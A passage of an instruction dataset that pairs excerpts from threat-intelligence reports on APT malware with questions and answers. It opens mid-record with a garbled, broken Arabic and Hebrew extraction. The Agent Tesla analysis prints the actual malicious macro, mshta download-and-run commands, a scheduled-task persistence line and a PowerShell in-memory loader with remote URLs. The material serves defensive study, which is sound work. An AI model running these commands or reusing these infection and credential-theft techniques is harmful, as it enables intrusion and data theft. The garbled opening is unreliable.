\u0627\u0639\u0633\u0644\u0648\u064a\u062f\u0629\n(Highlights of matters attributed by Egypt to the leaks from the Saudi foreign service)\n\u0627\u062a\u0645\u0644\u0647\u0645 \u0627 \u0644\u062d\u0642\u064a\u0642\u064a \u064a\u0641 \u0631\u0638\u0646 \u0631 \u064a\u0633\u0648\u0627 \u0628 \u0629\u064a\u0636\u0642 \u0627\u0637\u0644\u0626\u0627\u0631\u0629 \u0627 \u062a\u0644\u064a \u0623 \u0637\u0642\u0633\u062a \u064a\u0641 \u0646\u064a\u0633 \u0621\u0627\n(Translation: \"the real culprit behind the plane crash in Sinai, according to Russia\")\n\u05e8\u05d0\u05d4\n\u05d1 \u05d7\u05e4\u05e9\u05d5\u05ea \u05d5\u05e1\u05d5\u05d3\u05ea \u05d4\u05d0\u05d8\u05dd\u05d5 \u05e9 \u05dc \u05d9\u05e8\u05e9\u05d0\u05dc\n\"\n18\n(The USA reveals Israel's nuclear secrets)\n\u05ea\u05d0\n. preposition accusative the ofomission\u2013error  syntax  a includes titleThe18\n\u00a9 Clearsky - Cyber security.\nSpy vs. Spy: Inside the Fraying U.S.-Israel Ties.exe\n\u05d4\u05e9\u05de\u05d8\u05e8\u05d4 \u05d5\u05d1\u05d3\u05ea\u05e7 \u05e9\u05d7\u05d3 \u05de\u05dc\u05e1\u05ea\u05e8\u05d9 \u05de\u05de\u05e1\u05d9\u05db\u05dd \u05d9\u05d9\u05d3\u05d5\u05e1\u05dd\n\nHow does the short time frame between the compilation of a malware sample and its submission to VirusTotal indicate the actions of the attacker? What preventive measures can be taken based on this observation?",
    "output": "The short time frame between the compilation of a malware sample and its submission to VirusTotal indicates that the attacker likely submitted the sample themselves to check if it is detected by antivirus engines. This behavior suggests that the attacker is testing the effectiveness of their malware. Preventive measures based on this observation include monitoring VirusTotal submissions for newly compiled samples, especially those originating from regions associated with the attackers, such as Gaza. Early detection and analysis of these samples can help in proactively updating antivirus signatures and improving overall security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Danger Close: Fancy Bear Tracking of Ukrainian Field Artillery Units\nAdam Meyers\n12/21/2016\nUpdate \u2013 As of March 2017, the estimated losses of D-30 howitzer platform have been amended. According to an update provided by the International Institute for Strategic Studies (IISS) Research Associate for Defence and Military Analysis, Henry Boyd, their current assessment is as follows: \"excluding the Naval Infantry battalion in the Crimea which was effectively captured wholesale, the Ukrainian Armed Forces lost between 15% and 20% of their pre-war D\u201330 inventory in combat operations.\"\nIn June CrowdStrike (<https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/>)identified and attributed a series of targeted intrusions at the Democratic National Committee (DNC), and other political organizations that utilized a well known implant commonly called X-Agent. X-Agent is a cross platform remote access toolkit, variants have been identified for various Windows operating systems, Apple's iOS, and likely the MacOS. Also known as Sofacy, X-Agent has been tracked by the security community for almost a decade, CrowdStrike associates the use of X-Agent with an actor we call (<https://www.crowdstrike.com/blog/who-is-fancy-bear/>)FANCY BEAR. This actor to date is the exclusive operator of the malware, and has continuously developed the platform for ongoing operations which CrowdStrike assesses is likely tied to Russian Military Intelligence (GRU). The source code to this malware has not been observed in the public domain and appears to have been developed uniquely by FANCY BEAR.\nLate in the summer of 2016, (<https://www.crowdstrike.com/products/falcon-intelligence/>)CrowdStrike Intelligence analysts began investigating a curious Android Package\n(APK) named '\u041f\u043e\u043f\u0440-\u041430.apk' (MD5: 6f7523d3019fa190499f327211e01fcb) which contained a number of Russian language artifacts that were military in nature. Initial research identified that the filename suggested a relationship to the D-30 122mm towed howitzer, an artillery weapon first manufactured in the Soviet Union in the 1960s but still in use today. In-depth reverse engineering revealed the APK contained an Android variant of X-Agent, the command and control protocol was closely linked to observed Windows variants of X-Agent, and utilized a cryptographic algorithm called RC4 with a very similar 50 byte base key.\nThe filename '\u041f\u043e\u043f\u0440-\u041430.apk' was linked to a legitimate application which was initially developed domestically within Ukraine by an officer of the 55th Artillery Brigade named Yaroslav Sherstuk. In media interviews Mr. Sherstuk claims that the application, which had some 9000 users, reduced the time to fire the D-30 from minutes to seconds. No evidence of the application has been observed on the Android app store, making it unlikely that the app was distributed via that platform.\nQ: What was the significance of the Android Package (APK) named '\u041f\u043e\u043f\u0440-\u041430.apk', and how did CrowdStrike Intelligence analysts link it to the activities of FANCY BEAR?",
    "output": "The Android Package (APK) named '\u041f\u043e\u043f\u0440-D30.apk' was significant because it contained military-related Russian language artifacts and was linked to the D-30 122mm towed howitzer, an artillery weapon still in use today. Through in-depth reverse engineering, CrowdStrike Intelligence analysts discovered that the APK contained an Android variant of X-Agent, a malware exclusively operated by FANCY BEAR. The command and control protocol of this Android variant was closely linked to observed Windows variants of X-Agent and utilized a cryptographic algorithm called RC4 with a very similar 50-byte base key. Additionally, the filename '\u041f\u043e\u043f\u0440-D30.apk' was linked to a legitimate application developed by an officer of the 55th Artillery Brigade named Yaroslav Sherstuk, which had around 9000 users and significantly reduced the time to fire the D-30 howitzer.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Threat Research\nApril 23, 2019 | by ,\nUpdate (April 30): Following the release of our four-part CARBANAK Week blog series, many readers have found places to make the data shared in these posts actionable. We have updated this post to include some of this information.\nIn the , we wrote about how string hashing was used in CARBANAK to manage Windows API resolution throughout the entire codebase. But the authors used this same string hashing algorithm for another task as well. In this installment, we'll pick up where we left off and write about CARBANAK's antivirus (AV) detection, AV evasion, authorship artifacts, exploits, secrets, and network-based indicators.\n\nBased on the above text, answer a question. How did the authors of CARBANAK use string hashing beyond managing Windows API resolution, and what additional tasks did it facilitate within the malware?",
    "output": "The authors of CARBANAK employed string hashing not only for managing Windows API resolution but also for another significant task. Specifically, they utilized the same string hashing algorithm for antivirus (AV) detection and AV evasion. This dual-purpose application of string hashing showcases the sophisticated nature of the malware, enabling it to both resolve necessary APIs dynamically and evade detection mechanisms implemented by antivirus software.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Leverage Malicious Macro in PowerPoint\nAs you probably guessed, the attached file is fake. There is no slide in the PowerPoint file, but a macro containing an auto-run function method called \"Auto_Open()\". This function is called once the file is opened in MS PowerPoint.\nHere is the VBA code of this method:\nSub Auto_Open()\np_ = soraj.bear.GroupName\nShell p_\nEnd Sub\n\"soraj\" is the name of a UserForm, \"bear\" is the name of CheckBox control inside \"soraj\" form. It calls \"Shell\" to execute a command read from the \"GroupName\" property of \"bear\" CheckBox control.\nIn this code, \"soraj\" is the name of a UserForm and \"bear\" is the name of the CheckBox control inside the \"soraj\" form. It calls \"Shell\" to execute a command read from the \"GroupName\" property of the \"bear\" CheckBox control.\nFigure 2.1 \u2013 The value of the property \"GroupName\" of \"bear\"\nFurther, \"mshta hxxp[:]//bitly[.]com/gdhamksgdsadj\" is the value of the \"soraj.bear.GroupName\" which is shown in Figure 2, and is the content of a binary profile file (named \"o\") of the VBA project.\nIt consists of \"mshta\" and a URL, where \"mshta\" (\"mshta.exe\") is a Windows default program that executes HTML application files, including scripts (like VBScript). The URL opened by \"mshta\" is redirected to another URL, \"hxxps[:]//onedayiwillloveyouforever[.]blogspot.com/p/divine111.html\", which contains a piece of code used to write an escaped VBScript code to a current HTML document to be executed by \"mshta.exe\".\nFigure 2.2 is a screenshot of a proxy tool, allowing you to see the URL redirection and escaped VBScript code in the response packet.\nFigure 2.2 \u2013 The escaped VBScript code in the response packet\nThe escaped VBScript code is executed within the current HTML document using \"mshat.exe\". I will refer to this kind of VBScript as VBScript-embedded-in-HTML in this analysis.  to view the entire un-escaped code of the VBScript-embedded-in-HTML.\nMedium Headline: 1. Upgrading \u2013 Task Scheduler:\nThe malware seeks to obtain a new version (if applicable) every two hours to be executed on the victim's system. To do this the VBScript-embedded-in-HTML performs a command-line command to add a recurring task into Task Scheduler. The code snippet below is used to run \"schtasks\" command with the \"/create\" option to create a new scheduled task, as shown in Figure 3.1.\nargs = \"/create /sc MINUTE /mo 120 /tn \"\"\"\"update-Yendex \"\"\"\" /F /tr \"\"\"\"\\\"\"\"\"MsHtA\"\"\"\"\\\"\"\"\"hxxps://madarbloghogya.blogspot.com/p/divineback222.html\"\"\"\"\nSet Somosa = GetObject(\"new:13709620-C279-11CE-A49E-444553540000\")\n'schtasks\n'open\nSomosa Shellexecute StrReverse(\"sksathcs\"), args, \"\", StrReverse(\"nepo\"),  0\nFigure 3.1 \u2013 Added scheduled task in Task Scheduler\nIt executes a VBScript code within a remote HTML file, then downloads the Agent Tesla payload to run on the victim's system. It also detects and kills any other Agent Tesla process instances already running. This allows it to perform its upgrading function.\nMedium Headline: 2. Persistence \u2013 StartMenu Startup:\nA standalone VBS file, \"%Public%\\\", extracted from VBScript-embedded-in-HTML downloads another base64-encoded VBS file from \"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/5X7My8/b271c1b3c7a78e7b68fa388ed463c7cc1dc32ddb/files/divine12\" into a local file. Going through the base64-decoded code, it saves the VBS code to a file called \"UYA-update.vbs\" located under %Public% folder.\nThis standalone VBS file downloads the Agent Tesla payload and deploys it on the victim's system. As a result, whenever the VBS file is executed it starts Agent Tesla.\nTo keep Agent Tesla alive on the victim's system, it copies the downloaded standalone VBS file \"UYA-update.vbs\" into the StartMenu's Startup folder and renames it as \"GTQ.vbs\". This allows it to start automatically when the system starts. Figure 3.2 displays the Startup folder with the copied \"GTQ.vbs\".\nFigure 3.2 \u2013 Standalone VBS file copied in StartMenu Startup folder\nMedium Headline: 3. Perform process-hollowing:\n\"UYA-update.vbs\" continues to craft a piece of PowerShell code within a base64-decoded PE file from a local variable. It is ultimately executed by \"PowerShell.exe\". The decoded PE file is a .Net program that contains a function named \"Run()\" belonging to class \"ClassLibrary3.Class1\". Below is a piece of PowerShell code used to call this function.\n[System.AppDomain]::CurrentDomain.Load($fuUN).GetType('ClassLibrary3.Class1').GetMethod('Run').Invoke($null, [object[]] ('1-\n1enivid/selif/c4ab4d371cd40ce3303b4d33c868122f671fd37c/do8qxn/aygoh/steppins/0.2/ipa!/gro.tekcubtib//:sptth'))\nThe \"$fuUN\" variable contains the base64-decoded .Net PE file, from which it calls GetType() and GetMethod() to obtain the function \"ClassLibrary3.Class1.Run()\". Next, it calls the \"Run()\" function through Invoke() and passes a parameter with a reversed URL. The URL is \"hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine11\". Figure 3.3 is the entire code of function \"ClassLibrary3.Class1.Run()\".\nFigure 3.3 \u2013 Function of \"ClassLibrary3.Class1.Run()\"\nAfter successfully calling \"ClassLibrary3.Class1.Run()\" of the decoded PE, it downloads two files from the hyperlinks: 'hxxp[:]//149.56.200.165/rump/1.txt', which is for another .Net module to perform process-hollowing, and 'hxxps[:]//bitbucket[.]org/!api/2.0/snippets/hogya/nxq8od/c73df176f221868c33d4b3033ec04dc173d4ba4c/files/divine1-1', which is passed from PowerShell and is where it downloads the Agent Tesla payload from.\nThe Agent Tesla payload is fileless on the victim's system. It is only kept in the memory of the PowerShell process. The downloaded .Net module has a function named \"ClassLibrary1.Class1.Run()\" that perform the process-hollowing. It passes the Agent Tesla payload in memory and adds a path of the target process \"RegAsm.exe\".\n\"RegAsm.exe\" is an official component of Microsoft .Net Framework. The attacker uses it as a target process in which to inject malware to protect itself from being detected.\nA number of Windows  functions are called in the .Net module to deploy the Agent Tesla payload into the target process. These are:\nCreateProcess() with CREATE_SUSPENDED flag: This creates a suspended RegAsm.exe process.\nVirtualAllocEx(), NtUnmapViewOfSection(), ReadProcessMemory(), WriteProcessMemory(): These move the Agent Tesla payload to a newly-allocated memory within the suspended RegAsm.exe process.\nSetThreadContext()/Wow64SetThreadContext(), GetThreadContext()/Wow64GetThreadContext(): These modify the RegAsm.exe's registry value and points its EIP register to the entry point of the copied Agent Tesla payload.\nResumeThread(): This resumes the execution of the RegAsm.exe process from where the EIP points to.\nOnce completed, the Agent Tesla runs on behalf of RegAsm.exe to steal the victim's information.\nBig Headline: Agent Tesla Payload\nAgent Tesla provides many features, like Keylogger, obtaining Clipboard data, stealing browser cookies and saved software credentials, as well as capturing screenshots of the victim's device.\nAgent Tesla publishes a Setup program that allows the attacker to choose which features to enable. The Tesla Agent Setup program then compiles the Agent Tesla payload file according to those choices.\nAgent Tesla starts these tasks in its Main() (stealing credentials), Timer (keylogger, stealing clipboard data, taking screenshots), and Thread (stealing cookies from browsers) functions.\nIn this variant of Agent Tesla, the attacker has only enabled stealing credentials and cookies. The count of the software clients from which it steals credentials is more than 70, and can be categorized as Web Browsers, Email Clients, IM Clients, VPN/FTP/Downloader/Database Clients, and Windows Credentials.\nThe list of the affected software clients is listed as below:\nMedium Headline: Others:\nMySQL and Microsoft Credentials.\nFigure 4.1 displays the method used for stealing credentials from several clients.\nFigure 4.1 \u2013 Method used to steal credentials from some software clients\nFigure 4.2 \u2013 Display of stolen credentials from IceCat browser\nFigure 4.2 shows the credentials just stolen from a web browser, \"IceCat\", where \"Browser\" is the software client name, \"Password\" is the saved password, \"URL\" is the login page, and \"UserName\" is the saved login user name.\nEach credentials of the stolen credentials has an above structure and saved in a global list variable, which later is formatted and sent to the attacker.\n\nHow does the malicious macro in the PowerPoint file initiate the infection process? Describe the sequence of events from opening the file to executing the initial payload.",
    "output": "The malicious macro in the PowerPoint file initiates the infection process through an auto-run function called 'Auto_Open()'. When the file is opened, this function executes a command read from the 'GroupName' property of a CheckBox control named 'bear' inside a UserForm named 'soraj'. The command is 'mshta hxxp[:]//bitly[.]com/gdhamksgdsadj', which uses 'mshta.exe' to execute an HTML application file. This URL redirects to another URL, 'hxxps[:]//onedayiwillloveyouforever[.]blogspot.com/p/divine111.html', containing a piece of VBScript code embedded in HTML. This VBScript code is then executed within the current HTML document using 'mshta.exe'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Dskapi.ocx\nName of the module used in Gauss: \"Godel\" or \"Kurt\".\nCreates events: \"{12258790-A76B}\", \"Global\\RasSrvReady\"\nAll functionality is implemented in \"RevertCache\" export. The module starts its main thread and then returns. The main thread waits for the \"{12258790-A76B}\" event and continuously checks for the presence of anti-malware software.\n\"ValidateEntry\" signals the \"{12258790-A76B}\" event, allowing for the main thread to work for 3 seconds before terminating it.\nWrites log file: %temp%\\~gdl.tmp\nThe log file entries are compressed with Zlib.\nReads registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\nChecks for running anti-malware products by names and exits if they are present:\nIt also exits if started on Windows 7 SP 1.\nBy querying disk enum in registry, it also tries to identify whether the storage is USB-connected or not by searching \"USBSTOR\" string in their information.\nWhen a drive contains \".thumbs.db\" file, its contents are read and checked for the valid magic number 0xEB397F2B. If it matches, the module creates %commonprogramfiles%\\system\\wabdat.dat and writes the data to this file, and then deletes \".thumbs.db\".\nThen, it infects the USB drives by creating directories with the names .Backup0[D-M] and .Backup00[D-M]\nInfected USB root folder (before activation)\nEach directory contains a specially crafted desktop.ini file and target.lnk file that exploits the LNK vulnerability.\ntarget.lnk\nListing of .Backup0* directory\nIn the root directory of the drive it creates files \"System32.dat\" and \"System32.bin\", the payload DLLs, and the \".thumbs.db\" file. The payloads are stored as resources and encrypted with a simple XOR routine.\nBig Headline: USB Payload\nBoth 32-bit and 64-bit DLLs implement the same functionality. When loaded using the LNK vulnerability, they start a main thread and return. The main thread copies the payload to %TEMP% directory and loads itself again. When loaded from %TEMP%, it creates a mutex \"Isvp4003ltrEvent\", patches the \"NtQueryDirectoryFile\" function in ntdll.dll so that it hides its files and then sends the \"F5\" key event to windows of classes \"SysListView32\", \"SysTreeView32\", \"DirectUIHWND\", causing Explorer directory listings to refresh. This hides the files. It also waits for the event \"Global\\RasSrvReady\".\nThen, it retrieves the following data from the system:\n\u25ba Version of the Windows OS\n\u25ba Workstation info\n\u25ba Network adapter information\n\u25ba Routing table\n\u25ba Process list\n\u25ba Environment variables and disk information\n\u25ba List of visible network shares\n\u25ba Network proxy information\n\u25ba List of visible MS SQL servers\n\u25ba URL cache\nAll this information is encoded and appended to the file \".thumbs.db\" on the infected storage. This file also contains a TTL (time to live) value that is decremented by 1 each time the payload starts from the infected storage. When this counter becomes equal to zero, the payload disinfects the media by removing \".Backup0*\" directories and \"System32.dat\" and \"System32.bin\" files, leaving \".thumbs.db\" file with collected information. Known value of the TTL value is \"30.\"\nThere are several \"special\" versions of the payload. They contain additional PE sections with names \".exsdat,\" \".exrdat,\" and \".exdat\". These sections are encrypted with RC4. The encryption key is derived from an MD5 hash performed 10000 times on a combination of \"%PATH%\" environment string and name of the directory in %PROGRAMFILES%.\nThe RC4 key is not yet known, neither is the contents of these sections. The payload also contains a binary resource 100 that is also encrypted.\nBig Headline: Smdk.ocx\nName of the module used in Gauss: \"UsbDir\"\nCreates events: \"{B336C220-B158}\", \"Global\\SmSrvReady\"\nAll functionality is implemented in \"RevertCache\" export. The module starts its main thread and then returns. The main thread waits for the \"{B336C220-B158}\" event and continuously checks for the presence of anti-malware software.\n\"ValidateEntry\" signals the \"{B336C220-B158}\" event, allowing for the disk enumeration routine to start.\nWrites log file: %temp%\\~mdk.tmp\nReads registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\nChecks for running antimalware products by names and exits if they are present:\nThe version of the module built on 27.09.2011 also exits if started on Windows 7 SP 1.\nBy querying disk enum in registry, it also tries to identify whether the storage is USB-connected or not by searching\n\"USBSTOR\" string in their information.\nThe log file entries are compressed with Zlib.\nBig Headline: Lanhlp32.ocx\nName of the module used in Gauss: \"Tailor\"\nThe module is a Windows DLL file with one exported function called \"DllRegisterServer.\"\nIt contains encrypted debug information that includes the location of the project, \"d:\\projects\\tailor\\\":\nd:\\projects\\tailor\\utils\\Exceptions.h\n..\\Utils\\Buffer.cpp\n..\\Utils\\CryptUtils.cpp\n..\\Utils\\Event.cpp\n..\\Utils\\EveryoneSecurityAttributes.cpp\n..\\Utils\\File.cpp\n..\\Utils\\Mutex.cpp\n..\\Utils\\MyWlanApi.cpp\n..\\Utils\\OsUtils.cpp\n..\\Utils\\RemoteMemoryBuffer.cpp\n..\\Utils\\Storage.cpp\n..\\Utils\\StringUtils.cpp\n..\\Utils\\Waiter.cpp\n.\\SavedWNetworkConnectionsWin5.cpp\n.\\SavedWNetworkConnectionsWin6.cpp\n.\\VisibleNetworks.cpp\nCreates mutex : Global\\EnvDBE\nCreates log file: %systemroot%\\Temp\\s61cs3.dat\nOperates on Windows XP, Windows Vista and Windows 7.\nOn Windows XP:\n.\\SavedWNetworkConnectionsWin5.cpp\nEnumerates registry keys in HKLM\\SOFTWARE\\Microsoft\\WZCSVC\\Parameters\\Interfaces\\\nExtracts \"Static#\" values that contain wireless key data.\nOn Windows Vista and Windows 7 :\n..\\Utils\\MyWlanApi.cpp\n.\\SavedWNetworkConnectionsWin6.cpp\n.\\VisibleNetworks.cpp\nUses extended wlanapi.dll API to access WLAN information. Enumerates available wireless interfaces, then enumerates all profiles and extracts SSID, name and wireless key information. Then, it retrieves the list of wireless networks visible to all the wireless interfaces.\nThe log file is encrypted with a simple 1-byte XOR.\nBig Headline: Devwiz.ocx\nName of the module used in Gauss: \"Cosmos\"\nThe module is a Windows DLL file with one exported function called \"RefreshDev.\"\nIt creates log file : %WINDIR%\\temp\\~ZM6AD3.tmp\nThe log file is not encrypted and starts with a magic number 0xF68B973D\nThe module collects the following information and writes it to the log file :\n\u25ba CMOS RAM contents\n\u25ba Registry keys :\n[ HKLM\\HARDWARE\\DESCRIPTION\\System ] SystemBiosVersion,SystemBiosDate\n[ HARDWARE\\DESCRIPTION\\System\\BIOS ]\nBIOSVendor, BIOSVersion, BIOSReleaseDate, BaseBoardManufacturer, BaseBoardProduct, BaseBoardVersion, SystemFamily,\nSystemManufacturer, SystemProductName, SystemSKU, SystemVersion\nAll retrieved information is written to the log file.\nVersion info \"devwiz.ocx\"\n\nDescribe the process by which the 'Tailor' module in Gauss collects wireless network information on different versions of Windows and how it handles the collected data.",
    "output": "The 'Tailor' module in Gauss collects wireless network information differently depending on the version of Windows. On Windows XP, it enumerates registry keys in HKLM\\\\SOFTWARE\\\\Microsoft\\\\WZCSVC\\\\Parameters\\\\Interfaces\\\\ and extracts 'Static#' values that contain wireless key data. On Windows Vista and Windows 7, it uses the extended wlanapi.dll API to access WLAN information. It enumerates available wireless interfaces, then enumerates all profiles and extracts SSID, name, and wireless key information. It also retrieves the list of wireless networks visible to all the wireless interfaces. The collected information is written to a log file located at '%systemroot%\\\\Temp\\\\s61cs3.dat'. This log file is encrypted with a simple 1-byte XOR to protect the data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Case Summary\nThe threat actors activity occurred in two bursts within a 3 day time frame. As with our previous case, they started by uploading their web shell and disabling antivirus services.\nSoon after, they established two persistence methods. The first was through scheduled tasks, and the second, was via a newly created account. The account was then added to the \"remote desktop users\" and \"local administrators users\" groups. Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call (<https://github.com/fatedier/frp>)Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.\nAfter establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig. At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.\nAll of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out. The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.\nTwo days later, we saw the threat actors reappear. We expected them to pick up where they left off, however, they repeated all previous actions. Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.\nNo further activity was observed as the threat actors were evicted from the network.\n\nHow did APT35 establish persistence in the compromised system, and what tools or techniques were used to automate their initial access?",
    "output": "A: APT35 established persistence in the compromised system through two primary methods. The first method involved creating scheduled tasks, which allowed the threat actors to maintain access to the system over time. The second method involved creating a new user account, which was then added to both the 'remote desktop users' and 'local administrators users' groups. This ensured that the threat actors could remotely access the system with elevated privileges. Additionally, APT35 employed automated scripts to execute their activities, as evidenced by the rapid sequence of actions occurring within a short time frame and the presence of specific user agent strings such as 'python-requests/2.26.0' and 'python-urllib3/1.26.7'. These scripts likely facilitated the uploading of web shells, disabling of antivirus services, and the use of a modified version of Fast Reverse Proxy (FRP) to connect to suspect domains.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why did the Dust Storm backdoor perform tests such as adding and removing a user and creating and deleting a folder before attempting to access the Windows Service Control Manager?",
    "output": "The Dust Storm backdoor performed these tests to ensure it had the necessary permissions and capabilities to execute more advanced operations on the system. By adding and removing a user and creating and deleting a folder, the backdoor could verify that it had administrative privileges and could manipulate the file system. These tests served as a preliminary check before proceeding with more sensitive actions, such as accessing the Windows Service Control Manager.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Trident Ursa APT use Scheduled Tasks to maintain persistence on compromised systems?",
    "output": "Scheduled Tasks are a feature in operating systems that allow users to schedule programs or scripts to be executed at a specified date and time. Adversaries, including the Trident Ursa APT, can abuse this functionality to facilitate initial or recurring execution of malicious code. In the case of Trident Ursa, they use Scheduled Tasks to execute their malicious VBScripts on a recurring basis, every five minutes, to maintain persistence on compromised systems. Specifically, the VBScript responsible for enabling persistent access to the system creates a new scheduled task named 'Filmora.Complete' that runs the 'josephine' script every five minutes. Similarly, another variant of the malware creates a scheduled task named 'GetSynchronization-USA' to automatically run the payload VBScript every five minutes. By using Scheduled Tasks in this way, Trident Ursa is able to ensure that their malware remains active on compromised systems, even after a reboot or other system changes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Phishing Emails\nBetween June and August of this year, we observed a total of 20 unique emails being sent to the following email addresses:\nThese emails contained a series of subject lines, primarily revolving around the topic of \u0417\u0430\u043f\u0430\u0434-2017 ( (<https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BF%D0%B0%D0%B4-2017>)'West-2017'), also known in English as (<https://en.wikipedia.org/wiki/Zapad_2017_exercise>)Zapad 2017. Zapad 2017 was a series of joint military exercises conducted by the Armed Forces of the Russian Federation and the Republic of Belarus, held from September 14th to 20th in 2017.\nThe full list of subject lines is as follows:\nFwd:\u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430 \u043a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: Fwd:Preparing for the West-2017]\n\u0432\u044b\u043f\u0443\u0441\u043a \u0432\u043e\u0441\u043f\u0438\u0442\u0430\u043d\u043d\u0438\u043a\u043e\u0432 [Translation: graduation]\n\u041a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: To West-2017]\n\u0417\u0430\u043f\u0430\u0434-2017 [Translation: West-2017]\nAn example of some of the previously mentioned emails may be seen below.\nBig Headline: Decoy Documents\nWe observed that the attachments used in these emails contained a mixture of file types. RTF documents, Microsoft Word documents, and a RAR archive. The RAR archive contained a series of images, a decoy document, and a Microsoft Windows executable within it. The executable has a .scr file extension, and is designed to look like a Windows folder, as seen below:\nThe rough translation of the folder and file names above are 'Preparations for large-scale West-2017 exercises in this format are being held for the first time.' Within the actual folder, there are a series of JPG images, as well as a decoy document with a title that is translated to 'Thousands of Russian and Belarusian military are involved in the training of the rear services.'\nThe decoy document contains the following content:\nThe other RTF and Word documents used additional decoy documents, which can be seen below.\nWhile we observed different techniques being used for delivery, all attachments executed a variant of the CMSTAR malware family. We observed minor changes between variants, which we discuss in the CMSTAR Variations and Payloads section of the blog post.\nThe Word documents, which we track as Werow, employ malicious macros for their delivery. More information about these macros may be found in the Appendix of the blog post. Additionally, we have included a script that extracts these embedded payloads that can also be found in the Appendix.\nThe RTF documents made use of (<https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641>)CVE-2015-1641. This vulnerability, patched in 2015, allows attackers to execute malicious code when these specially crafted documents are opened within vulnerable instances of Microsoft Word. The payload for these samples is embedded within them and obfuscated using a 4-byte XOR key of 0xCAFEBABE. We have included a script that can be used to extract the underlying payload of these RTFs statically that can be found in the Appendix.\nThe SCR file mentioned previously drops a CMSTAR DLL and runs it via an external call to rundll32.exe.\nBig Headline: CMSTAR Variations and Payloads\nIn total, we observed three variations of CMSTAR in these recent attacks against Belarusian targets. The biggest change observed between them looks to be minor modifications made to the string obfuscation routine. A very simple modification to the digit used in subtraction was modified between the variants, as shown below:\nThe older variation, named CMSTAR.A, was discussed in a previous blog post entitled, \"(<https://researchcenter.paloaltonetworks.com/2016/03/digital-quartermaster-scenario-demonstrated-in-attacks-against-the-mongolian-government/>)Digital Quartermaster Scenario Demonstrated in Attacks Against the Mongolian Government .\"\nThe CMSTAR.B variant was witnessed using both a different mutex from CMSTAR.A, as well as a slightly modified string obfuscation routine. The mutexes used by CMSTAR ensure that only one instance of the malware runs at a time. The CMSTAR.C variant used the same mutex as CMSTAR.B, however, again used another slightly modified string obfuscation routine. We found all CMSTAR variants using the same obfuscation routine when I payload was downloaded from a remote server. We have included a tool to extract mutex and C2 information from all three CMSTAR variants, as well as a tool to decode the downloaded payload: both may be found in the Scripts section.\nAn example of CMSTAR downloading its payload may be found below:\nWhen expanding the research to identify additional CMSTAR.B and CMSTAR.C variants, we identified a total of 31 samples. Of these 31 samples, we found two unique payloads served from three of the C2 URLS\u2014One of which was downloaded from a sample found in the phishing attacks previously described. Both payloads contained previously unknown malware families. We have named the payload found in the email campaign PYLOT, and the malware downloaded from the additional CMSTAR samples BYEBY.\nBoth malware families acted as backdoors, allowing the attackers to execute commands on the victim machine, as well as a series of other functions. More information about these individual malware families may be found in the appendix.\nBig Headline: Conclusion\nDuring the course of this research, we identified a phishing campaign consisting of 20 unique emails targeting the government of Belarus. The ploys used in these email and decoy documents revolved around a joint strategic military exercise of the Armed Forces of the Russian Federation and the Republic of Belarus, which took place between September 14th and September 20th of this year. While looking at the emails in question, we observed two new variants of the CMSTAR malware family. Between the samples identified and others we found while expanding our research scope, we identified two previously unknown malware families.\nPalo Alto customers are protected from this threat in the following ways:\nTags have been created in AutoFocus to track (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.Cmstar>)CMSTAR, (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.BYEBY>)BYEBY, and (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.PYLOT>)PYLOT\nAll observed samples are identified as malicious in WildFire\nDomains observed to act as C2s have been flagged as malicious\nTraps 4.1 identifies and blocks the CVE-2015-1641 exploit used in these documents\nTraps 4.1 blocks the macros used in the malicious Word documents\nA special thanks to Tom Lancaster for his assistance on this research.\nMedium Headline: Werow Macro Analysis\nThe attacker used the same macro dropper all of the observed Microsoft Word documents we analyzed for this campaign. It begins by building the following path strings:\n%APPDATA%\\d.doc\n%APPDATA%\\Microsoft\\Office\\WinCred.acl\nThe 'd.doc' path will be used to store a copy of the Word document, while the 'WinCred.acl' will contain the dropped payload, which is expected to be a DLL.\nWerow uses rudimentary obfuscation to hide and re-assemble the following strings:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinCred\nrundll32 %APPDATA%\\Microsof\\Office\\WinCred.acl ,WinCred\nThese strings will be used at the end of the macro's execution to ensure persistence via the Run registry key.\nThe malware proceeds to read an included overlay within the original Word document from a given offset. This data is decoded using and XOR operation, as well as an addition operation. It can be represented in Python as follows:\nOnce this overlay is decoded, it is written to the 'WinCred.acl' file and loaded with the 'WinCred' export. A script has been provided in the Scripts section that, in conjunction with 